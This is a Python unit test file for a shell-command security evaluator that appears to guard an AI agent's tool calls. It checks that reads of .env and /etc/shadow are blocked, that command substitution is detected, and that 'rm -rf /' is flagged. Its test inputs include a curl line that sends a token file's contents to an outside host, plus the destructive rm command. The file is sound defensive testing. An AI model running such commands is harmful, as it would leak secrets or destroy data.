"""Unit tests for Dynamic Substitution Tool-Calling Inspector & 5 Guardrails."""

import os
import sys
import tempfile
from pathlib import Path

# Add scripts directory to path
sys.path.insert(0, str(Path(__file__).parent.parent / "scripts"))

from security_evaluator import (
    safe_read_file_content,
    audit_shell_command,
    DYNAMIC_SUBSTITUTION_PATTERN,
)


def test_guardrails():
    print("Testing 5 Guardrails on safe_read_file_content...")

    # Guard 1: Sensitive file blocked
    success, msg = safe_read_file_content(".env")
    assert not success, f"Expected .env to be blocked, got: {msg}"
    print("  ✅ Guard 1 Passed: .env read blocked")

    # Guard 2: System directory blocked
    success, msg = safe_read_file_content("/etc/shadow")
    assert not success, f"Expected /etc/shadow to be blocked, got: {msg}"
    print("  ✅ Guard 2 Passed: /etc/shadow read blocked")

    # Guard 3: Safe regular file read
    with tempfile.NamedTemporaryFile("w", delete=False) as f:
        f.write("build/app.js\nbuild/index.html")
        tmp_path = f.name

    try:
        success, content = safe_read_file_content(tmp_path)
        assert success, f"Expected safe read to succeed, got: {content}"
        assert "build/app.js" in content
        print("  ✅ Guard 3 Passed: Safe file read succeeds")
    finally:
        os.unlink(tmp_path)


def test_pattern_detection():
    print("\nTesting Dynamic Substitution Pattern Detection...")

    # Should match
    assert DYNAMIC_SUBSTITUTION_PATTERN.search("cp $(cat safe_list.txt) ~/dest/")
    assert DYNAMIC_SUBSTITUTION_PATTERN.search("rm `cat list.txt`")
    assert DYNAMIC_SUBSTITUTION_PATTERN.search("curl http://example.com/$(<token.txt)")
    assert DYNAMIC_SUBSTITUTION_PATTERN.search("cp $(find . -name '*.txt') ~/dest/")
    print("  ✅ Pattern Detection Passed: $(cat ...), `cat ...`, $(<...) detected")

    # Static commands should NOT match
    assert not DYNAMIC_SUBSTITUTION_PATTERN.search("cp file1.txt file2.txt")
    assert not DYNAMIC_SUBSTITUTION_PATTERN.search("ln -sfn src dst")
    assert not DYNAMIC_SUBSTITUTION_PATTERN.search("mkdir -p ~/new_dir")
    print("  ✅ Static Commands Passed: No false positive on regular static commands")


def test_static_command_evaluation():
    print("\nTesting Static Command Evaluation & Layer Attribution...")
    safe, reason, layer = audit_shell_command("cp /tmp/file1.txt /tmp/file2.txt")
    assert safe, f"Expected static cp in /tmp to be safe, got: {reason}"
    assert layer == "FAST_TRACK_AST", f"Expected FAST_TRACK_AST, got {layer}"

    safe, reason, layer = audit_shell_command("ln -sfn ~/.agents/skills/foo ~/.config/foo")
    assert safe, f"Expected static ln to be safe, got: {reason}"
    assert layer == "FAST_TRACK_AST", f"Expected FAST_TRACK_AST, got {layer}"

    safe, reason, layer = audit_shell_command("rm -rf /")
    assert not safe, f"Expected rm -rf / to be blocked, got: {reason}"
    assert layer == "SHELL_CRITICAL", f"Expected SHELL_CRITICAL, got {layer}"
    print("  ✅ Static Command Audits & Layer Attribution Passed")


if __name__ == "__main__":
    test_guardrails()
    test_pattern_detection()
    test_static_command_evaluation()
    print("\n🎉 ALL TESTS PASSED SUCCESSFULLY!")
